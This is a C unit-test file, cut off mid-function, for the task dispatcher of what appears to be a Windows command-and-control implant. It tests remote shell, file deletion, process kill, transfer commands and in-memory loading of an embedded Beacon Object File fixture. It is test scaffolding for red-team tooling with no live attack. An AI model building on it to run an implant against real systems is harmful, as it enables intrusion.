/* Task dispatch tests. Test-only; never linked into the agent.
 *
 * Both builds must exit 0 under wine (the second exercises the
 * build-time command list exclusion path):
 *
 *   zig cc -target x86_64-windows-gnu tasks_test.c tasks.c mythic.c
 *     config.c crypto.c cJSON.c sock.c mqtt.c dns.c http.c teams.c
 *     sysinfo.c coff.c execasm.c -lbcrypt -lwinhttp -lws2_32 -liphlpapi
 *     -lole32 -loleaut32 -lshell32 -o tasks.exe && wine tasks.exe
 *   zig cc -target x86_64-windows-gnu tasks_test.c tasks.c mythic.c
 *     config.c crypto.c cJSON.c sock.c mqtt.c dns.c http.c teams.c
 *     sysinfo.c coff.c execasm.c '-DCFG_COMMANDS="shell,exit"' -lbcrypt
 *     -lwinhttp -lws2_32 -liphlpapi -lole32 -loleaut32 -lshell32
 *     -o tasks_restricted.exe && wine tasks_restricted.exe
 */
#include "common.h"
#include "config.h"
#include "mythic.h"
#include "tasks.h"
#include "cJSON.h"
#include "coff.h"
#include "execasm.h"
#include <stdio.h>

static int failures = 0;

#define CHECK(cond, ...) do { \
    if (!(cond)) { \
        printf("FAIL %s:%d: ", __FILE__, __LINE__); \
        printf(__VA_ARGS__); \
        printf("\n"); \
        failures++; \
    } \
} while (0)

/* bof_fixture: fixture_bof_test.c for x86_64-windows-gnu. Regenerate
 * with the command in fixture_bof_test.c, then re-embed the bytes. */
static const unsigned char bof_fixture[] = {
    0x64, 0x86, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x33, 0x02, 0x00, 0x00,
    0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e, 0x74, 0x65, 0x78,
    0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x00, 0x00, 0x2c, 0x01, 0x00, 0x00, 0xa4, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x20, 0x00, 0x50, 0x60,
    0x2e, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe0, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x30, 0xc0, 0x2e, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x30, 0xc0, 0x2e, 0x78, 0x64, 0x61,
    0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0c, 0x00, 0x00, 0x00, 0xe0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x30, 0x40,
    0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0xec, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x10, 0x40, 0x2e, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
    0x05, 0x02, 0x00, 0x00, 0x11, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x03, 0x00, 0x00, 0x00, 0x40, 0x00, 0x30, 0x40, 0x2f, 0x33, 0x36, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0x2f, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x10, 0x00,
    0x55, 0x48, 0x83, 0xec, 0x70, 0x48, 0x8d, 0x6c, 0x24, 0x70, 0x48, 0x89,
    0x4d, 0xf8, 0x89, 0x55, 0xf4, 0xc7, 0x45, 0xd0, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8b, 0x55, 0xf8, 0x44, 0x8b, 0x45, 0xf4, 0x48, 0x8d, 0x4d, 0xd8,
    0xe8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0xd8, 0xe8, 0x00, 0x00,
    0x00, 0x00, 0x89, 0x45, 0xd4, 0x48, 0x8d, 0x4d, 0xd8, 0x48, 0x8d, 0x55,
    0xd0, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0xc8, 0x44, 0x8b,
    0x45, 0xd4, 0x4c, 0x8b, 0x4d, 0xc8, 0x48, 0x8d, 0x0d, 0x15, 0x00, 0x00,
    0x00, 0x48, 0x89, 0xe0, 0x48, 0x89, 0x48, 0x28, 0xc7, 0x40, 0x20, 0x07,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x00, 0x00, 0x00, 0x00, 0x31, 0xc9,
    0xe8, 0x00, 0x00, 0x00, 0x00, 0x90, 0x48, 0x83, 0xc4, 0x70, 0x5d, 0xc3,
    0x25, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x04, 0x00, 0x2e, 0x00,
    0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x04, 0x00, 0x3e, 0x00, 0x00, 0x00,
    0x12, 0x00, 0x00, 0x00, 0x04, 0x00, 0x51, 0x00, 0x00, 0x00, 0x08, 0x00,
    0x00, 0x00, 0x04, 0x00, 0x66, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x6d, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x00, 0x04, 0x00,
    0x01, 0x0a, 0x03, 0x75, 0x0a, 0x03, 0x05, 0xd2, 0x01, 0x50, 0x00, 0x00,
    0x6e, 0x3d, 0x25, 0x64, 0x20, 0x7a, 0x3d, 0x25, 0x73, 0x20, 0x74, 0x61,
    0x69, 0x6c, 0x3d, 0x25, 0x64, 0x20, 0x25, 0x73, 0x00, 0x65, 0x6e, 0x64,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x04,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x08, 0x00, 0x00,
    0x00, 0x06, 0x00, 0x00, 0x00, 0x03, 0x00, 0x10, 0x11, 0x12, 0x13, 0x2e,
    0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
    0x00, 0x00, 0x00, 0x03, 0x01, 0x78, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00,
    0x00, 0x83, 0x2c, 0x40, 0xf9, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e,
    0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
    0x00, 0x00, 0x00, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e,
    0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03,
    0x00, 0x00, 0x00, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e,
    0x78, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04,
    0x00, 0x00, 0x00, 0x03, 0x01, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x78, 0xdb, 0xd9, 0xff, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e,
    0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05,
    0x00, 0x00, 0x00, 0x03, 0x01, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xfe, 0x47, 0x09, 0x30, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e,
    0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06,
    0x00, 0x00, 0x00, 0x03, 0x01, 0x0c, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
    0x00, 0x25, 0x8a, 0xb5, 0x7f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07,
    0x00, 0x00, 0x00, 0x03, 0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xd5, 0xaf, 0xb7, 0xb1, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
    0x66, 0x65, 0x61, 0x74, 0x2e, 0x30, 0x30, 0x00, 0x00, 0x00, 0x00, 0xff,
    0xff, 0x00, 0x00, 0x03, 0x00, 0x67, 0x6f, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x20, 0x00, 0x02, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x2e,
    0x66, 0x69, 0x6c, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xfe,
    0xff, 0x00, 0x00, 0x67, 0x01, 0x66, 0x69, 0x78, 0x74, 0x75, 0x72, 0x65,
    0x5f, 0x62, 0x6f, 0x66, 0x5f, 0x74, 0x65, 0x73, 0x74, 0x2e, 0x63, 0x4f,
    0x00, 0x00, 0x00, 0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74,
    0x61, 0x49, 0x6e, 0x74, 0x00, 0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44,
    0x61, 0x74, 0x61, 0x45, 0x78, 0x74, 0x72, 0x61, 0x63, 0x74, 0x00, 0x2e,
    0x6c, 0x6c, 0x76, 0x6d, 0x5f, 0x61, 0x64, 0x64, 0x72, 0x73, 0x69, 0x67,
    0x00, 0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x50, 0x72, 0x69, 0x6e, 0x74,
    0x66, 0x00, 0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74, 0x61,
    0x50, 0x61, 0x72, 0x73, 0x65, 0x00,
};

static void test_command_in_list(void) {
    CHECK(command_in_list("", "shell") == 1, "empty list allows all");
    CHECK(command_in_list("shell,exit", "shell") == 1, "first");
    CHECK(command_in_list("shell,exit", "exit") == 1, "last");
    CHECK(command_in_list("shell,exit", "ls") == 0, "missing");
    CHECK(command_in_list("shell,exit", "shel") == 0, "prefix must not match");
    CHECK(command_in_list("shell,exit", "shellx") == 0, "superstring must not match");
    CHECK(command_in_list("shell,exit", "hell") == 0, "substring must not match");
    CHECK(command_in_list("shell, exit", "exit") == 1, "spaces tolerated");
}

static void run_task(agent_t *a, const char *command, const char *parameters,
                     response_t *resp, char **output, int *exit_now) {
    task_t t;
    t.command = (char *)command;
    t.parameters = (char *)parameters;
    t.id = "1";
    memset(resp, 0, sizeof(*resp));
    *output = NULL;
    *exit_now = 0;
    CHECK(task_dispatch(a, &t, resp, output, exit_now) == 0, "dispatch %s returns 0", command);
}

static void task_cleanup(response_t *resp, char **output) {
    free(*output);
    *output = NULL;
    free(resp->extra_json);
    resp->extra_json = NULL;
}

static void test_exit_unknown(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    run_task(a, "exit", "", &resp, &output, &exit_now);
    CHECK(exit_now == 1, "exit sets exit_now");
    CHECK(resp.user_output && strcmp(resp.user_output, "exiting") == 0, "exit output");
    task_cleanup(&resp, &output);
    run_task(a, "rm-rf", "", &resp, &output, &exit_now);
    CHECK(exit_now == 0, "unknown sets no exit");
    CHECK(resp.status && strstr(resp.status, "unknown command") != NULL, "unknown status, got %s",
          resp.status ? resp.status : "(null)");
    task_cleanup(&resp, &output);
}

static void test_sleep(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    run_task(a, "sleep", "5 10", &resp, &output, &exit_now);
    if (command_in_list(CFG_COMMANDS, "sleep")) {
        CHECK(a->interval == 5 && a->jitter == 10, "sleep sets %d/%d", a->interval, a->jitter);
    } else {
        CHECK(resp.status && strstr(resp.status, "not included") != NULL, "sleep excluded");
    }
    task_cleanup(&resp, &output);
}

static void test_shell(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    run_task(a, "shell", "echo hi", &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "shell status %s", resp.status);
    CHECK(resp.user_output && strstr(resp.user_output, "hi") != NULL, "shell output");
    {
        cJSON *wrap = resp.extra_json ? cJSON_Parse(resp.extra_json) : NULL;
        cJSON *arr = wrap ? cJSON_GetObjectItemCaseSensitive(wrap, "artifacts") : NULL;
        cJSON *one = arr ? cJSON_GetArrayItem(arr, 0) : NULL;
        CHECK(one != NULL, "shell artifact");
        if (one) {
            CHECK(strcmp(json_str(one, "base_artifact"), "Process Create") == 0, "artifact base");
            CHECK(strstr(json_str(one, "artifact"), "cmd.exe /c echo hi") != NULL, "artifact text");
        }
        cJSON_Delete(wrap);
    }
    task_cleanup(&resp, &output);
}

static void test_ls(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    if (!command_in_list(CFG_COMMANDS, "ls")) {
        run_task(a, "ls", ".", &resp, &output, &exit_now);
        CHECK(resp.status && strstr(resp.status, "not included") != NULL,
              "excluded ls, got %s", resp.status ? resp.status : "(null)");
        task_cleanup(&resp, &output);
        return;
    }
    {
        char tmp[MAX_PATH], dir[MAX_PATH], file[MAX_PATH], params[MAX_PATH + 32];
        HANDLE h;
        DWORD n = GetTempPathA(sizeof(tmp), tmp);
        CHECK(n > 0 && n < sizeof(tmp), "temp path");
        snprintf(dir, sizeof(dir), "%serlikhan-ls-test", tmp);
        CreateDirectoryA(dir, NULL);
        snprintf(file, sizeof(file), "%s\\probe.txt", dir);
        h = CreateFileA(file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        CHECK(h != INVALID_HANDLE_VALUE, "probe file");
        if (h != INVALID_HANDLE_VALUE)
            CloseHandle(h);
        snprintf(params, sizeof(params), "%s", dir);
        run_task(a, "ls", params, &resp, &output, &exit_now);
        CHECK(strcmp(resp.status, "success") == 0, "ls status %s", resp.status);
        CHECK(resp.user_output && strstr(resp.user_output, "probe.txt") != NULL, "ls output");
        task_cleanup(&resp, &output);
        DeleteFileA(file);
        RemoveDirectoryA(dir);
    }
}

static void test_xfer_chunk_size(void) {
    CHECK(xfer_chunk_size("http") == 512000, "http chunk");
    CHECK(xfer_chunk_size("mqtt") == 512000, "mqtt chunk");
    CHECK(xfer_chunk_size("dns") == 8192, "dns chunk");
    CHECK(xfer_chunk_size("msteams") == 8192, "teams chunk");
    CHECK(xfer_chunk_size("") == 512000, "default chunk");
    CHECK(xfer_chunk_size(NULL) == 512000, "null chunk");
}

static void test_post_reply_find(void) {
    cJSON *reply = cJSON_Parse("{\"responses\":[{\"task_id\":\"1\",\"file_id\":\"f\"},{\"task_id\":\"2\",\"status\":\"error\",\"error\":\"no\"}]}");
    cJSON *r;
    CHECK(reply != NULL, "parse reply");
    if (!reply)
        return;
    r = post_reply_find(reply, "2");
    CHECK(r != NULL, "find task 2");
    if (r) {
        CHECK(strcmp(json_str(r, "error"), "no") == 0, "error field");
        CHECK(json_num(r, "total_chunks") == 0, "missing num");
        CHECK(strcmp(json_str(r, "missing"), "") == 0, "missing str");
    }
    CHECK(post_reply_find(reply, "3") == NULL, "miss");
    CHECK(post_reply_find(NULL, "1") == NULL, "null reply");
    cJSON_Delete(reply);
}

static void test_ls_json(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    if (!command_in_list(CFG_COMMANDS, "ls")) {
        run_task(a, "ls", ".", &resp, &output, &exit_now);
        CHECK(resp.extra_json == NULL, "excluded ls has no fragment");
        task_cleanup(&resp, &output);
        return;
    }
    {
        char tmp[MAX_PATH], dir[MAX_PATH], file[MAX_PATH];
        HANDLE h;
        DWORD n = GetTempPathA(sizeof(tmp), tmp), wrote = 0;
        cJSON *wrap, *fb, *files;
        int i, found = 0;
        CHECK(n > 0 && n < sizeof(tmp), "temp path");
        snprintf(dir, sizeof(dir), "%serlikhan-lsjson-test", tmp);
        CreateDirectoryA(dir, NULL);
        snprintf(file, sizeof(file), "%s\\probe.txt", dir);
        h = CreateFileA(file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        CHECK(h != INVALID_HANDLE_VALUE, "probe file");
        if (h != INVALID_HANDLE_VALUE) {
            WriteFile(h, "12345", 5, &wrote, NULL);
            CloseHandle(h);
        }
        run_task(a, "ls", dir, &resp, &output, &exit_now);
        CHECK(strcmp(resp.status, "success") == 0, "ls status %s", resp.status);
        CHECK(resp.extra_json != NULL, "ls fragment present");
        wrap = resp.extra_json ? cJSON_Parse(resp.extra_json) : NULL;
        CHECK(wrap != NULL, "fragment parses");
        fb = wrap ? cJSON_GetObjectItemCaseSensitive(wrap, "file_browser") : NULL;
        CHECK(fb != NULL, "file_browser key");
        if (fb) {
            CHECK(json_str(fb, "name")[0] != '\0', "parent name");
            CHECK(json_str(fb, "parent_path")[0] != '\0', "parent path");
            files = cJSON_GetObjectItemCaseSensitive(fb, "files");
            CHECK(files && cJSON_IsArray(files), "files array");
            if (files) {
                for (i = 0; i < cJSON_GetArraySize(files); i++) {
                    cJSON *c = cJSON_GetArrayItem(files, i);
                    if (strcmp(json_str(c, "name"), "probe.txt") != 0)
                        continue;
                    found = 1;
                    CHECK(cJSON_IsTrue(cJSON_GetObjectItemCaseSensitive(c, "is_file")), "probe is_file");
                    CHECK(json_num(c, "size") == 5, "probe size");
                }
            }
            CHECK(found, "probe listed");
        }
        cJSON_Delete(wrap);
        task_cleanup(&resp, &output);
        DeleteFileA(file);
        RemoveDirectoryA(dir);
    }
}

static void test_rm_mkdir(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    char tmp[MAX_PATH], dir[MAX_PATH], sub[MAX_PATH], file[MAX_PATH];
    HANDLE h;
    DWORD n;
    cJSON *wrap, *arr;
    if (!command_in_list(CFG_COMMANDS, "mkdir") || !command_in_list(CFG_COMMANDS, "rm")) {
        run_task(a, "mkdir", "x", &resp, &output, &exit_now);
        CHECK(resp.extra_json == NULL, "excluded mkdir");
        task_cleanup(&resp, &output);
        run_task(a, "rm", "x", &resp, &output, &exit_now);
        CHECK(resp.extra_json == NULL, "excluded rm");
        task_cleanup(&resp, &output);
        return;
    }
    n = GetTempPathA(sizeof(tmp), tmp);
    CHECK(n > 0 && n < sizeof(tmp), "temp path");
    snprintf(dir, sizeof(dir), "%serlikhan-rm-test", tmp);
    snprintf(sub, sizeof(sub), "%s\\nested", dir);
    run_task(a, "mkdir", sub, &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "mkdir status %s", resp.status);
    CHECK(strstr(resp.user_output, "created") != NULL, "mkdir output");
    task_cleanup(&resp, &output);
    CHECK(GetFileAttributesA(sub) != INVALID_FILE_ATTRIBUTES, "nested dir exists");
    snprintf(file, sizeof(file), "%s\\f.txt", sub);
    h = CreateFileA(file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    CHECK(h != INVALID_HANDLE_VALUE, "probe file");
    if (h != INVALID_HANDLE_VALUE)
        CloseHandle(h);
    run_task(a, "rm", dir, &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "rm status %s", resp.status);
    CHECK(resp.extra_json != NULL, "rm fragment");
    wrap = resp.extra_json ? cJSON_Parse(resp.extra_json) : NULL;
    arr = wrap ? cJSON_GetObjectItemCaseSensitive(wrap, "removed_files") : NULL;
    CHECK(arr && cJSON_IsArray(arr) && cJSON_GetArraySize(arr) == 1, "removed_files shape");
    {
        cJSON *arts = wrap ? cJSON_GetObjectItemCaseSensitive(wrap, "artifacts") : NULL;
        cJSON *one = arts ? cJSON_GetArrayItem(arts, 0) : NULL;
        CHECK(one && strcmp(json_str(one, "base_artifact"), "File Delete") == 0, "rm artifact");
    }
    cJSON_Delete(wrap);
    task_cleanup(&resp, &output);
    CHECK(GetFileAttributesA(dir) == INVALID_FILE_ATTRIBUTES, "tree gone");
    run_task(a, "rm", dir, &resp, &output, &exit_now);
    CHECK(resp.status && strstr(resp.status, "error") != NULL, "rm missing errors");
    task_cleanup(&resp, &output);
}

static void test_transfer_errors(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    char tmp[MAX_PATH], missing[MAX_PATH];
    DWORD n = GetTempPathA(sizeof(tmp), tmp);
    CHECK(n > 0 && n < sizeof(tmp), "temp path");
    snprintf(missing, sizeof(missing), "%sno-such-dir-xyz\\f.bin", tmp);
    run_task(a, "download", missing, &resp, &output, &exit_now);
    if (command_in_list(CFG_COMMANDS, "download"))
        CHECK(resp.status && strstr(resp.status, "cannot open") != NULL, "download missing, got %s",
              resp.status ? resp.status : "(null)");
    else
        CHECK(resp.status && strstr(resp.status, "not included") != NULL, "download excluded");
    task_cleanup(&resp, &output);
    run_task(a, "upload", "{}", &resp, &output, &exit_now);
    if (command_in_list(CFG_COMMANDS, "upload"))
        CHECK(resp.status && strstr(resp.status, "no file id") != NULL, "upload no file, got %s",
              resp.status ? resp.status : "(null)");
    else
        CHECK(resp.status && strstr(resp.status, "not included") != NULL, "upload excluded");
    task_cleanup(&resp, &output);
    run_task(a, "upload", "{\"file\": \"u\"}", &resp, &output, &exit_now);
    if (command_in_list(CFG_COMMANDS, "upload"))
        CHECK(resp.status && strstr(resp.status, "no remote path") != NULL, "upload no path, got %s",
              resp.status ? resp.status : "(null)");
    task_cleanup(&resp, &output);
}

static void test_ps_kill(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    char mypid[32];
    DWORD me = GetCurrentProcessId();
    snprintf(mypid, sizeof(mypid), "%lu", (unsigned long)me);
    if (!command_in_list(CFG_COMMANDS, "ps")) {
        run_task(a, "ps", "", &resp, &output, &exit_now);
        CHECK(resp.extra_json == NULL, "excluded ps");
        task_cleanup(&resp, &output);
    } else {
        cJSON *wrap, *arr;
        int i, found = 0, named = 0;
        run_task(a, "ps", "", &resp, &output, &exit_now);
        CHECK(strcmp(resp.status, "success") == 0, "ps status %s", resp.status);
        CHECK(resp.user_output && strstr(resp.user_output, mypid) != NULL, "ps lists self");
        CHECK(resp.extra_json != NULL, "ps fragment");
        wrap = resp.extra_json ? cJSON_Parse(resp.extra_json) : NULL;
        arr = wrap ? cJSON_GetObjectItemCaseSensitive(wrap, "processes") : NULL;
        CHECK(arr && cJSON_IsArray(arr) && cJSON_GetArraySize(arr) > 0, "processes array");
        if (arr) {
            for (i = 0; i < cJSON_GetArraySize(arr); i++) {
                cJSON *r = cJSON_GetArrayItem(arr, i);
                if ((DWORD)json_num(r, "process_id") == me) {
                    found = 1;
                    if (json_str(r, "name")[0] != '\0')
                        named = 1;
                }
            }
        }
        CHECK(found, "self in processes");
        CHECK(named, "self named");
        cJSON_Delete(wrap);
        task_cleanup(&resp, &output);
    }
    if (!command_in_list(CFG_COMMANDS, "kill")) {
        run_task(a, "kill", "1234", &resp, &output, &exit_now);
        CHECK(resp.status && strstr(resp.status, "not included") != NULL, "kill excluded");
        task_cleanup(&resp, &output);
        return;
    }
    run_task(a, "kill", "abc", &resp, &output, &exit_now);
    CHECK(resp.status && strstr(resp.status, "usage") != NULL, "kill abc, got %s",
          resp.status ? resp.status : "(null)");
    task_cleanup(&resp, &output);
    run_task(a, "kill", "99999991", &resp, &output, &exit_now);
    CHECK(resp.status && strstr(resp.status, "cannot open") != NULL, "kill missing, got %s",
          resp.status ? resp.status : "(null)");
    task_cleanup(&resp, &output);
    {
        char self[MAX_PATH], cmdline[MAX_PATH + 16], pidarg[32];
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        DWORD code = 0;
        GetModuleFileNameA(NULL, self, sizeof(self));
        snprintf(cmdline, sizeof(cmdline), "\"%s\" --hang", self);
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        memset(&pi, 0, sizeof(pi));
        CHECK(CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi),
              "spawn hang child");
        if (pi.hProcess) {
            snprintf(pidarg, sizeof(pidarg), "%lu", (unsigned long)pi.dwProcessId);
            run_task(a, "kill", pidarg, &resp, &output, &exit_now);
            CHECK(strcmp(resp.status, "success") == 0, "kill child %s", resp.status);
            CHECK(resp.user_output && strstr(resp.user_output, pidarg) != NULL, "kill output");
            {
                cJSON *wrap = resp.extra_json ? cJSON_Parse(resp.extra_json) : NULL;
                cJSON *arts = wrap ? cJSON_GetObjectItemCaseSensitive(wrap, "artifacts") : NULL;
                cJSON *one = arts ? cJSON_GetArrayItem(arts, 0) : NULL;
                CHECK(one && strcmp(json_str(one, "base_artifact"), "Process Kill") == 0,
                      "kill artifact");
                cJSON_Delete(wrap);
            }
            task_cleanup(&resp, &output);
            CHECK(WaitForSingleObject(pi.hProcess, 10000) == WAIT_OBJECT_0, "child reaped");
            GetExitCodeProcess(pi.hProcess, &code);
            CHECK(code == 1, "child exit code %lu", (unsigned long)code);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

static void test_load_unload(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    if (!command_in_list(CFG_COMMANDS, "load")) {
        run_task(a, "load", "sleep", &resp, &output, &exit_now);
        CHECK(resp.status && strstr(resp.status, "not included") != NULL, "load excluded");
        task_cleanup(&resp, &output);
        return;
    }
    run_task(a, "unload", "sleep", &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "unload status %s", resp.status);
    task_cleanup(&resp, &output);
    run_task(a, "sleep", "5 10", &resp, &output, &exit_now);
    CHECK(resp.status && strstr(resp.status, "not included") != NULL, "sleep unloaded, got %s",
          resp.status ? resp.status : "(null)");
    task_cleanup(&resp, &output);
    run_task(a, "load", "sleep", &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "load status %s", resp.status);
    task_cleanup(&resp, &output);
    run_task(a, "sleep", "5 10", &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "sleep reloaded %s", resp.status);
    CHECK(a->interval == 5 && a->jitter == 10, "sleep works after load");
    task_cleanup(&resp, &output);
    run_task(a, "unload", "exit", &resp, &output, &exit_now);
    CHECK(resp.status && strstr(resp.status, "cannot unload") != NULL, "unload exit, got %s",
          resp.status ? resp.status : "(null)");
    task_cleanup(&resp, &output);
    run_task(a, "load", "nope", &resp, &output, &exit_now);
    CHECK(resp.status && strstr(resp.status, "unknown command") != NULL, "load unknown, got %s",
          resp.status ? resp.status : "(null)");
    task_cleanup(&resp, &output);
}

/* Packed BOF args the way the container sends them: u32LE total, raw
 * LE i32 42, LE-length-prefixed NUL-terminated "hi". */
static const unsigned char coff_test_args[] = {
    11, 0, 0, 0, 42, 0, 0, 0, 3, 0, 0, 0, 'h', 'i', 0,
};

static void test_coff_fixture(void) {
    char *out = NULL;
    /* Executes the embedded BOF for real: map, relocate, Beacon API. */
    CHECK(coff_run(bof_fixture, sizeof(bof_fixture), "go", coff_test_args,
                   sizeof(coff_test_args), 30, &out) == 0,
          "coff fixture runs");
    CHECK(out && strcmp(out, "n=42 z=hi tail=7 end") == 0, "coff fixture output, got %s",
          out ? out : "(null)");
    free(out);
    out = NULL;
    CHECK(coff_run(bof_fixture, sizeof(bof_fixture), "missing", coff_test_args,
                   sizeof(coff_test_args), 5, &out) != 0,
          "coff missing entrypoint fails");
    CHECK(out && strstr(out, "entrypoint") != NULL, "coff entrypoint error text");
    free(out);
    {
